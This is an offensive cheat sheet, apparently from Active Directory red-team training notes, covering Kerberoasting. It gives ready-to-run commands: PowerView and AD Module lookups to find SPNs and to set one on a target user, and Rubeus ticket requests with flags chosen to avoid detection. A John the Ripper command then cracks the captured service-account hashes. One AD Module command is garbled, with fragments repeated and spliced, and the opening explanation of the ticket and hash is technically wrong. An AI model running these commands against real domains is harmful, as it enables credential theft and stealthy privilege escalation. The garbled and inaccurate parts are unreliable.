# Kerberoast

In a Kerberoast attack, the attacker requests a Kerberos session ticket (TGS) to retrieve the service account's NTLM hash, which is partially encrypted with the service account's hash.\
This hash is then cracked offline to extract the service account's password.\\

## SPNs

### Find SPNs

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -SPN
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADUser -Filter {Servicer -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalNameGet-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalNameGet-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
```
{% endtab %}
{% endtabs %}

## Set SPNs

With enough rights (GenericAll/GenericWrite), a target user's SPN can be set but must be unique in the forest.

{% tabs %}
{% tab title="PowerView" %}
```powershell
# Find Permissions - for example RDPUsers group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Set SPN
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}

```
{% endtab %}

{% tab title="AD Module" %}
```
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='dcorp/whatever'}
```
{% endtab %}
{% endtabs %}

## TGS

```powershell
# try to downgrade to RC4-HMAC and get hashes
Rubeus.exe kerberoast 

# to avoid detections look for Kerberoastable accounts that only support RC4_HMAC
Rubeus.exe kerberoast /rc4opsec

# Specific SPN - more stealth
Rubeus.exe kerberoast /user:svcadmin  /rc4opsec

# use Rubeus to get hashes for the svcadmin account:
**NOTE:**  we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if 'This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes.

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

# usefull flags
/outfile:hashes.txt # output the hashes into file
/simple # hashes are output in the console one per line
/nowrap # results will not be line wrapped
/stats # will output statistics about kerberoastable users found
```
{% hint style="warning" %} use John the Ripper to brute-force the hashes. Please note that you need to remove ":1433" from the SPN in hashes.txt before running John {% endhint %}

**before:**

<figure><img src="../assets/kerberosting-hash1.png" alt=""><figcaption></figcaption></figure>

**after:** 

<figure><img src="../assets/kerberosting-hash2.png" alt=""><figcaption></figcaption></figure>

## Crack

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
```
